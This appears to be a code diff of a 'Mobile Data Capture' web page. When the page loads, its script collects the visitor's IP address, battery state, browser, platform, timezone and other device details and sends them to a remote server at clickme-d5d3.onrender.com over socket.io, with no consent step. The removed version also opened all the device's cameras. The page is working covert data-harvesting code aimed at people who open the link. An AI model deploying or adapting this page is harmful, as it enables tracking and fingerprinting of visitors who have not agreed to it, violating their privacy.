@@ -5,55 +5,24 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mobile Data Capture</title>
     <link rel="manifest" href="manifest.json">
-   <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-<script>
-    const socket = io("https://clickme-d5d3.onrender.com/"); // Change to your actual server URL
-
-    function sendData() {
-        const data = {
-            ip: document.getElementById("ipAddress").textContent,
-            screenResolution: document.getElementById("screenResolution").textContent,
-            platform: document.getElementById("osVersion").textContent,
-            browser: document.getElementById("browser").textContent,
-            batteryLevel: document.getElementById("batteryLevel").textContent,
-            chargingStatus: document.getElementById("chargingStatus").textContent,
-            touchSupport: document.getElementById("touchSupport").textContent === "Yes",
-            orientation: document.getElementById("orientation").textContent,
-            language: document.getElementById("language").textContent,
-            timezone: document.getElementById("timezone").textContent,
-            darkMode: document.getElementById("darkMode").textContent === "Enabled",
-            deviceMemory: document.getElementById("deviceMemory").textContent.replace(" GB", "")
-        };
-
-        console.log("Sending data:", data);
-        socket.emit("deviceData", data);
-    }
-
-    window.onload = () => {
-        displayInfo();
-        setTimeout(sendData, 3000); // Send data after 3 sec
-    };
-
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/service-worker.js').then(() => {
-                console.log('Service Worker Registered');
-            });
-        }
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script>
+        const socket = io("https://clickme-d5d3.onrender.com/"); // Change this to your server URL
 
         async function fetchIP() {
             try {
                 const response = await fetch("https://api64.ipify.org?format=json");
                 const data = await response.json();
                 document.getElementById("ipAddress").textContent = data.ip;
+                return data.ip;
             } catch (error) {
-                document.getElementById("ipAddress").textContent = "Failed to fetch";
+                return "Failed to fetch";
             }
         }
 
         function getDeviceInfo() {
             return {
                 screenResolution: `${screen.width} x ${screen.height}`,
-                userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 browser: detectBrowser(),
                 touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
@@ -68,81 +37,51 @@
         function detectBrowser() {
             const ua = navigator.userAgent;
             if (ua.includes("Firefox")) return "Mozilla Firefox";
-            if (ua.includes("SamsungBrowser")) return "Samsung Internet";
-            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
-            if (ua.includes("Edg")) return "Microsoft Edge";
             if (ua.includes("Chrome")) return "Google Chrome";
             if (ua.includes("Safari")) return "Apple Safari";
-            if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
+            if (ua.includes("Edg")) return "Microsoft Edge";
+            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
             return "Unknown";
         }
 
         async function getBatteryInfo() {
             if ('getBattery' in navigator) {
                 const battery = await navigator.getBattery();
-                updateBatteryUI(battery);
-                battery.addEventListener('levelchange', () => updateBatteryUI(battery));
-                battery.addEventListener('chargingchange', () => updateBatteryUI(battery));
+                document.getElementById("batteryLevel").textContent = `${Math.round(battery.level * 100)}%`;
+                document.getElementById("chargingStatus").textContent = battery.charging ? "Charging" : "Not Charging";
             }
         }
 
-        function updateBatteryUI(battery) {
-            document.getElementById("batteryLevel").textContent = `${Math.round(battery.level * 100)}%`;
-            document.getElementById("chargingStatus").textContent = battery.charging ? "Charging" : "Not Charging";
+        async function sendData() {
+            const ip = await fetchIP();
+            const deviceInfo = getDeviceInfo();
+            const data = {
+                ip,
+                ...deviceInfo
+            };
+            console.log("📤 Sending Data:", data);
+            socket.emit("deviceData", data);
         }
 
-        async function startCameras() {
-            const videoContainer = document.getElementById("videoContainer");
-            videoContainer.innerHTML = "";
-            
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const cameras = devices.filter(device => device.kind === "videoinput");
-            
-            if (!cameras.length) return videoContainer.innerHTML = "<p>No cameras found</p>";
-            
-            cameras.forEach(async (device) => {
-                const video = document.createElement("video");
-                video.autoplay = true;
-                video.width = 200;
-                video.height = 150;
-                videoContainer.appendChild(video);
-                
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { deviceId: device.deviceId } });
-                    video.srcObject = stream;
-                } catch {
-                    videoContainer.innerHTML += `<p>Camera access denied</p>`;
-                }
+        window.onload = () => {
+            sendData();
+            getBatteryInfo();
+        };
+
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/service-worker.js').then(() => {
+                console.log('✅ Service Worker Registered');
             });
         }
-
-        function displayInfo() {
-            const deviceInfo = getDeviceInfo();
-            document.getElementById("screenResolution").textContent = deviceInfo.screenResolution;
-            document.getElementById("osVersion").textContent = deviceInfo.platform;
-            document.getElementById("browser").textContent = deviceInfo.browser;
-            document.getElementById("touchSupport").textContent = deviceInfo.touchSupport ? "Yes" : "No";
-            document.getElementById("orientation").textContent = deviceInfo.orientation;
-            document.getElementById("language").textContent = deviceInfo.language;
-            document.getElementById("timezone").textContent = deviceInfo.timezone;
-            document.getElementById("darkMode").textContent = deviceInfo.darkMode ? "Enabled" : "Disabled";
-            document.getElementById("deviceMemory").textContent = `${deviceInfo.deviceMemory} GB`;
-            
-            fetchIP();
-            getBatteryInfo();
-            startCameras();
-        }
-
-        window.onload = displayInfo;
     </script>
 </head>
 <body>
     <h2>Mobile Device Data Capture</h2>
-    <table border="1" cellpadding="10">
+    <table border="1">
+        <tr><th>IP Address</th><td id="ipAddress">Loading...</td></tr>
         <tr><th>Screen Resolution</th><td id="screenResolution">Loading...</td></tr>
         <tr><th>Operating System</th><td id="osVersion">Loading...</td></tr>
         <tr><th>Browser</th><td id="browser">Loading...</td></tr>
-        <tr><th>IP Address</th><td id="ipAddress">Loading...</td></tr>
         <tr><th>Battery Level</th><td id="batteryLevel">Loading...</td></tr>
         <tr><th>Charging Status</th><td id="chargingStatus">Loading...</td></tr>
         <tr><th>Touchscreen Support</th><td id="touchSupport">Loading...</td></tr>
@@ -152,8 +91,5 @@
         <tr><th>Dark Mode</th><td id="darkMode">Loading...</td></tr>
         <tr><th>Device Memory</th><td id="deviceMemory">Loading...</td></tr>
     </table>
-
-    <h3>Live Camera Feeds:</h3>
-    <div id="videoContainer"></div>
 </body>
 </html>
